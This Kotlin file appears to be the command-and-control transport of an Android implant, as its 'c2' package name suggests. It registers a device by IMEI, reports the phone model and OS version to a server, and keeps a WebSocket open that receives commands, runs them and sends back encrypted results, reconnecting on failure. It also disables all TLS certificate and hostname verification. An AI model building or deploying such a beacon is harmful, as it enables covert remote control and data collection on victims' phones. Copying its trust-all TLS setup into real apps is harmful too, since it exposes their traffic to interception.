package org.synapse.core.c2

import android.os.Build
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import okhttp3.*
import java.util.concurrent.TimeUnit
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager
import java.security.cert.X509Certificate

class WebSocketTransport(
    private val serverUrl: String,
    private val onCommand: (Command) -> String,
    private val onStatus: (String) -> Unit = {}
) {
    companion object {
        private const val TAG = "Synapse.WS"
        private const val MAX_RECONNECT_DELAY = 120_000L
        private const val INITIAL_RECONNECT_DELAY = 2_000L
    }

    private val json = Json { ignoreUnknownKeys = true }

    private val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
        override fun checkClientTrusted(c: Array<X509Certificate>?, a: String?) {}
        override fun checkServerTrusted(c: Array<X509Certificate>?, a: String?) {}
        override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
    })

    private val client = OkHttpClient.Builder()
        .pingInterval(15, TimeUnit.SECONDS)
        .sslSocketFactory(
            SSLContext.getInstance("TLS").apply { init(null, trustAllCerts, java.security.SecureRandom()) }.socketFactory,
            trustAllCerts[0] as X509TrustManager
        )
        .hostnameVerifier { _, _ -> true }
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()

    private var ws: WebSocket? = null
    private var reconnectDelay = INITIAL_RECONNECT_DELAY
    private var shouldReconnect = true
    private var connected = false
    private var deviceId: String = ""

    // Device info collected at connect time
    @Serializable
    data class DeviceInfo(
        val model: String,
        val os_version: String,
        val arch: String,
        val hostname: String
    )

    // Register message matching server's WSMessage format
    @Serializable
    data class RegisterMessage(
        val type: String,
        val device_id: String,
        val info: DeviceInfo
    )

    // Result wrapper matching server's WSMessage format
    @Serializable
    data class ResultMessage(
        val type: String,
        val device_id: String,
        val command_id: String,
        val data: String
    )

    private fun collectDeviceInfo(): DeviceInfo {
        val model = Build.MODEL ?: "unknown"
        val osVersion = Build.VERSION.RELEASE ?: "0"
        val arch = Build.SUPPORTED_ABIS?.firstOrNull() ?: System.getProperty("os.arch") ?: "unknown"
        val hostname = Build.BRAND ?: "android"
        return DeviceInfo(
            model = model,
            os_version = osVersion,
            arch = arch,
            hostname = hostname
        )
    }

    fun connect(imei: String) {
        deviceId = imei
        shouldReconnect = true
        reconnectDelay = INITIAL_RECONNECT_DELAY
        doConnect()
    }

    fun disconnect() {
        shouldReconnect = false
        ws?.close(1000, "bye")
        ws = null
        connected = false
    }

    fun send(payload: String) {
        ws?.send(payload)
    }

    fun isConnected(): Boolean = connected

    private fun doConnect() {
        val request = Request.Builder().url(serverUrl).build()
        ws = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(ws: WebSocket, response: Response) {
                connected = true
                reconnectDelay = INITIAL_RECONNECT_DELAY
                onStatus("connected")

                val info = collectDeviceInfo()
                val registerMsg = json.encodeToString(RegisterMessage(
                    type = "register",
                    device_id = deviceId,
                    info = info
                ))
                Log.d(TAG, "Sending register: $registerMsg")
                ws.send(registerMsg)
            }

            override fun onMessage(ws: WebSocket, text: String) {
                try {
                    Log.d(TAG, "Received: $text")
                    val cmd = json.decodeFromString<Command>(text)
                    val encryptedResult = onCommand(cmd)

                    // Wrap encrypted result in proper WSMessage JSON
                    val resultMsg = json.encodeToString(ResultMessage(
                        type = "result",
                        device_id = deviceId,
                        command_id = cmd.cmd_id,
                        data = encryptedResult
                    ))
                    ws.send(resultMsg)
                } catch (e: Exception) {
                    Log.e(TAG, "parse error: ${e.message}")
                    // Send error result
                    val errMsg = json.encodeToString(ResultMessage(
                        type = "result",
                        device_id = deviceId,
                        command_id = "?",
                        data = """{"status":"error","error":"parse_failed:${e.message}"}"""
                    ))
                    ws.send(errMsg)
                }
            }

            override fun onFailure(ws: WebSocket, t: Throwable, resp: Response?) {
                connected = false
                onStatus("disconnected: ${t.message}")
                scheduleReconnect()
            }

            override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                connected = false
                onStatus("closed: $code")
                scheduleReconnect()
            }
        })
    }

    private fun scheduleReconnect() {
        if (!shouldReconnect) return
        Thread {
            Thread.sleep(reconnectDelay)
            reconnectDelay = (reconnectDelay * 2).coerceAtMost(MAX_RECONNECT_DELAY)
            doConnect()
        }.start()
    }
}
